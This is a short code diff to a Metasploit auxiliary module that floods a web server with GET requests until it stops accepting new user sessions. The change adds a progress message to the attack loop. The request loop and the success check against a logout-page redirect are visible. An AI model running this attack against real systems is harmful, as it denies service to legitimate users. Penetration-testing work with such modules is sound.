@@ -70,7 +70,10 @@ class Metasploit3 < Msf::Auxiliary
     print_status("#{peer} - Starting DoS attack")
 
     # Start attack
-    limit.times do
+    limit.times do |step|
+      if step % 100 == 0
+        print_status("#{peer} - #{step * 100 / limit}% accomplished...")
+      end
       res = send_request_cgi('method' => 'GET', 'uri' => '/')
       if res && res.headers['Location'] =~ /\/my\.logout\.php3\?errorcode=14/
         print_good("#{peer} - DoS accomplished: The maximum number of concurrent user sessions has been reached.")
